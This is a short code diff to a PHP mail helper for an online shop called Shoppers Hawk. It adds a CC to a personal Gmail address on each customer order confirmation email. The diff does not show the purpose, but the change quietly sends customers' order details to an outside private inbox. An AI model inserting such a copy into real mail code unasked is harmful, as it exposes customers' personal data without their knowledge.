@@ -18,6 +18,7 @@ if (! function_exists('OrderEmail')) {
       
         Mail::send('front.pages.orderemail', $data, function($message) use ($to_name, $to_email) {
         $message->to($to_email, $to_name)->subject('Order Confirmation ');
+        $message->cc(['pramodbit254@gmail.com']);
         $message->from('care@shoppershawk.com','Shoppers Hawk');
         });
     }
